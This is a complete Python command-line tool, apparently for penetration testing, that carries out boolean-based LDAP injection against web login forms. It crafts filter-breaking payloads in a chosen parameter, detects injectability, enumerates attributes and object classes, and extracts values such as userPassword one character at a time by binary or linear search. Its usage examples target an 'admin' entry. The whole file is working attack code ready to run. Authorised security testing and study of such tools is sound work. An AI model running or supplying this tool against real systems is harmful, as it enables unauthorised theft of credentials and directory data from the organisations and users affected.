#!/usr/bin/env python3
"""
LDAP Boolean-Based Injection Fuzzer

Extracts attribute values character-by-character via boolean-based LDAP
injection against AND-based filters like (&(uid=INPUT)(userPassword=INPUT)).

Injection closes the current condition and appends a boolean test:
    <target>)(attr=value*
producing:
    (&(uid=<target>)(attr=value*)(userPassword=*))
"""

import argparse
import string
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHARSET_ALPHA = string.ascii_lowercase + string.digits + "_-@.+="
CHARSET_FULL = (
    string.ascii_letters + string.digits + " !#$%&'*+,-./:;<>?@[\\]^_`{|}~"
)

COMMON_ATTRS = [
    "uid", "cn", "sn", "givenName", "mail", "userPassword",
    "description", "telephoneNumber", "title", "ou", "dc",
    "objectClass", "memberOf", "displayName", "sAMAccountName",
    "distinguishedName", "homeDirectory", "loginShell",
]

COMMON_OBJECT_CLASSES = [
    "top", "person", "organizationalPerson", "inetOrgPerson", "user",
    "posixAccount", "shadowAccount", "group", "groupOfNames",
    "organizationalUnit", "domain", "account", "simpleSecurityObject",
]

LDAP_ESCAPE = {"*": "\\2a", "(": "\\28", ")": "\\29", "\\": "\\5c", "\x00": "\\00"}


def escape_ldap(c):
    return LDAP_ESCAPE.get(c, c)


class Fuzzer:
    def __init__(self, url, method, data_pairs, headers, cookies, proxy,
                 true_string, false_string, true_code, true_len,
                 target, charset, max_len, delay, linear):
        self.session = requests.Session()
        self.url = url
        self.method = method
        self.data_pairs = data_pairs
        self.headers = headers
        self.cookies = cookies
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.true_string = true_string
        self.false_string = false_string
        self.true_code = true_code
        self.true_len = true_len
        self.baseline_len = None
        self.prefix = target or "*"
        self.charset = charset
        self.sorted_charset = sorted(charset)
        self.max_len = max_len
        self.delay = delay
        self.linear = linear

    def send(self, inject):
        data = {k: (inject if v == "FUZZ" else v) for k, v in self.data_pairs}
        req = self.session.get if self.method == "GET" else self.session.post
        key = "params" if self.method == "GET" else "data"
        return req(
            self.url, **{key: data},
            headers=self.headers, cookies=self.cookies,
            proxies=self.proxies, verify=False, allow_redirects=False,
        )

    def is_true(self, resp):
        if self.false_string and self.false_string in resp.text:
            return False
        if self.true_string and self.true_string in resp.text:
            return True
        if self.true_code is not None and resp.status_code == self.true_code:
            return True
        if self.true_len is not None and len(resp.text) == self.true_len:
            return True
        if self.baseline_len is not None and len(resp.text) != self.baseline_len:
            return True
        return False

    def test(self, inject):
        resp = self.send(inject)
        if self.delay:
            time.sleep(self.delay)
        return self.is_true(resp)

    def check_injectable(self):
        print("[*] Testing injectability...")
        resp_star = self.send("*")
        resp_bogus = self.send("xxNOTEXISTxx")

        injectable = False
        if self.is_true(resp_star) and not self.is_true(resp_bogus):
            print("[+] Injectable! Wildcard=true, bogus=false.")
            injectable = True
        elif (len(resp_star.text) != len(resp_bogus.text)
              or resp_star.status_code != resp_bogus.status_code):
            print("[+] Injectable! Response differs.")
            injectable = True
        else:
            print("[-] Wildcard and bogus look the same.")
            print("[!] Hint: for AND filters, set other fields to * (e.g. password=*)")

        print(f"    wildcard: status={resp_star.status_code} len={len(resp_star.text)}")
        print(f"    bogus:    status={resp_bogus.status_code} len={len(resp_bogus.text)}")
        self.baseline_len = len(resp_bogus.text)
        return injectable

    def enum_attrs(self, attrs=None):
        attrs = attrs or COMMON_ATTRS
        print(f"\n[*] Probing attributes (target: {self.prefix})...")
        found = []
        for attr in attrs:
            if self.test(f"{self.prefix})({attr}=*"):
                print(f"  [+] {attr}")
                found.append(attr)
            else:
                print(f"  [ ] {attr}")
        return found

    def enum_objectclass(self):
        print(f"\n[*] Brute-forcing objectClass (target: {self.prefix})...")
        found = []
        for oc in COMMON_OBJECT_CLASSES:
            if self.test(f"{self.prefix})(objectClass={oc}"):
                print(f"  [+] {oc}")
                found.append(oc)
        return found

    def _find_char_binary(self, attr, extracted):
        lo, hi = 0, len(self.sorted_charset) - 1
        while lo < hi:
            mid = (lo + hi + 1) // 2
            c = escape_ldap(self.sorted_charset[mid])
            if self.test(f"{self.prefix})({attr}>={extracted}{c})({attr}={extracted}*"):
                lo = mid
            else:
                hi = mid - 1
        candidate = self.sorted_charset[lo]
        if self.test(f"{self.prefix})({attr}={extracted}{escape_ldap(candidate)}*"):
            return candidate
        return None

    def _find_char_linear(self, attr, extracted):
        for c in self.charset:
            if self.test(f"{self.prefix})({attr}={extracted}{escape_ldap(c)}*"):
                return c
        return None

    def extract_value(self, attr):
        mode = "linear" if self.linear else "binary"
        print(f"\n[*] Extracting '{attr}' (target: {self.prefix}, mode: {mode})...")
        find_char = self._find_char_linear if self.linear else self._find_char_binary
        values = []

        while True:
            extracted = ""
            for _ in range(self.max_len):
                c = find_char(attr, extracted)
                if c is None:
                    break
                extracted += c
                sys.stdout.write(f"\r  [+] {attr}[{len(values)}] = {extracted}")
                sys.stdout.flush()

            if not extracted:
                break

            print(f"\r  [+] {attr}[{len(values)}] = {extracted}")
            values.append(extracted)

            exclude = "".join(f"(!({attr}={v}))" for v in values)
            if not self.test(f"{self.prefix}){exclude}({attr}=*"):
                break

        if not values:
            print(f"  [-] Could not extract '{attr}'")
        return values


def parse_args():
    parser = argparse.ArgumentParser(
        description="LDAP Boolean-Based Injection Fuzzer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
Examples:
  python3 ldap_bool_fuzz.py \\
    -u "http://target/login" -p username \\
    -d "username=FUZZ&password=*" \\
    --true-string "Login successful" \\
    --target admin --extract description

  python3 ldap_bool_fuzz.py \\
    -u "http://target/login" -p username \\
    -d "username=FUZZ&password=*" \\
    --true-string "Login successful" --all
""",
    )
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-p", "--param", required=True, help="Vulnerable parameter name")
    parser.add_argument("-m", "--method", default="POST", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", help="Request template with FUZZ marker (e.g. username=FUZZ&password=*)")
    parser.add_argument("-H", "--header", action="append", help="Extra header (Name: Value)")
    parser.add_argument("-b", "--cookie", action="append", help="Cookie (name=value)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)")

    parser.add_argument("--true-string", help="String present in true responses")
    parser.add_argument("--false-string", help="String present in false responses")
    parser.add_argument("--true-code", type=int, help="Status code for true responses")
    parser.add_argument("--true-len", type=int, help="Content length for true responses")

    parser.add_argument("--target", help="Target entry (e.g. 'admin') — default: * (any)")
    parser.add_argument("--attrs", help="Comma-separated attributes to probe/extract")
    parser.add_argument("--enum-attrs", action="store_true", help="Enumerate existing attributes")
    parser.add_argument("--enum-oc", action="store_true", help="Brute-force objectClass values")
    parser.add_argument("--extract", help="Comma-separated attributes to extract")
    parser.add_argument("--all", action="store_true", help="Run all enumeration + extraction")

    parser.add_argument("--full-charset", action="store_true", help="Use extended charset")
    parser.add_argument("--linear", action="store_true", help="Linear search instead of binary (>= operator)")
    parser.add_argument("--max-len", type=int, default=64, help="Max value length (default: 64)")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests in seconds")

    return parser.parse_args()


def main():
    args = parse_args()

    data = args.data or f"{args.param}=FUZZ"
    if "FUZZ" not in data:
        sys.exit("[!] Data template must contain FUZZ as the injection point.")

    headers = {k.strip(): v.strip() for k, v in
               (h.split(":", 1) for h in (args.header or []))}
    cookies = dict(c.split("=", 1) for c in (args.cookie or []))
    data_pairs = [(k, v) for k, v in (p.split("=", 1) for p in data.split("&"))]

    fz = Fuzzer(
        url=args.url, method=args.method, data_pairs=data_pairs,
        headers=headers, cookies=cookies, proxy=args.proxy,
        true_string=args.true_string, false_string=args.false_string,
        true_code=args.true_code, true_len=args.true_len,
        target=args.target,
        charset=CHARSET_FULL if args.full_charset else CHARSET_ALPHA,
        max_len=args.max_len, delay=args.delay, linear=args.linear,
    )

    fz.check_injectable()

    custom_attrs = args.attrs.split(",") if args.attrs else None

    if args.enum_attrs or args.all:
        found_attrs = fz.enum_attrs(custom_attrs)
    else:
        found_attrs = custom_attrs or ["uid", "cn", "userPassword"]

    if args.enum_oc or args.all:
        fz.enum_objectclass()

    if args.extract or args.all:
        extract_attrs = args.extract.split(",") if args.extract else found_attrs
        results = {}
        for attr in extract_attrs:
            vals = fz.extract_value(attr)
            if vals:
                results[attr] = vals

        print("\n" + "=" * 50)
        print("RESULTS")
        print("=" * 50)
        for attr, vals in results.items():
            for v in vals:
                print(f"  {attr} = {v}")
        if not results:
            print("  (none)")


if __name__ == "__main__":
    main()
